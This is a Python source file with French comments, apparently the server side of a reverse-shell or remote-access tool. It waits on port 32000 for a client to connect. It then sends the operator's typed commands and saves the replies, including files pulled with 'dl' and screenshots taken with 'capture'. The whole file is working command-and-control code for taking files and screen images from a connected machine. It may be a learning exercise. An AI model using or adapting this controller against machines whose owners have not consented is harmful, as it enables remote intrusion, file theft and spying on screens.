import socket
import platform

print(platform.platform())
HOST_PORT = 32000
HOST_IP = ""
MAX_DATA_SIZE = 1024


def socket_receive_all_data(socket_p, data_len):
    """:param socket_p
       :param data_len
       :returns la longueur de la data envoyée par le client
    """

    current_data_len = 0  # Longueur de la data courante
    total_data = None
    while current_data_len < data_len:  # data_len: longueur de la data qu'on veut récupérer
        chunck_len = data_len - current_data_len
        if chunck_len > MAX_DATA_SIZE:
            chunck_len = MAX_DATA_SIZE
        data = socket_p.recv(chunck_len)
        if not data:  # Si l'objet contenu dans data est None
            return None
        if not total_data:  # Si total_data ne contient rien encore, s'il contient None
            total_data = data
        else:
            total_data += data
        current_data_len += len(data)
    return total_data


def socket_send_command_and_receive_data(socket_p, command):
    if command == "":
        return None
    socket_p.sendall(command.encode())
    header_data = socket_receive_all_data(socket_p, 13)
    try:
        longueur_data = int(header_data.decode())
    except AttributeError:
        return None
    data_recues = socket_receive_all_data(socket_p, longueur_data)
    return data_recues


s = socket.socket()
s.bind((HOST_IP, HOST_PORT))
s.listen()

print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
connection_socket, client_address = s.accept()

print(f"Connexion établie avec {client_address}")


while True:
    dl_filename = None
    infos_data = socket_send_command_and_receive_data(connection_socket, "infos")
    if not infos_data:
        break
    commande = input(infos_data.decode() + " >")
    commande_split = commande.split(" ")
    if len(commande_split) == 2 and commande_split[0] == "dl":
        dl_filename = commande_split[1]
    elif len(commande_split) == 2 and commande_split[0] == "capture":
        dl_filename = commande_split[1]+".png"

    data_recues = socket_send_command_and_receive_data(connection_socket, commande)
    if not data_recues:
        break
    if dl_filename:
        if len(data_recues) == 1 and data_recues == b" ":
            print("Erreur: le fichier", dl_filename, "n'existe pas")
        else:
            with open(dl_filename, "wb") as f:
                f.write(data_recues)
            print("Fichier ", dl_filename, "téléchargé")
    else:
        print(data_recues.decode())

s.close()
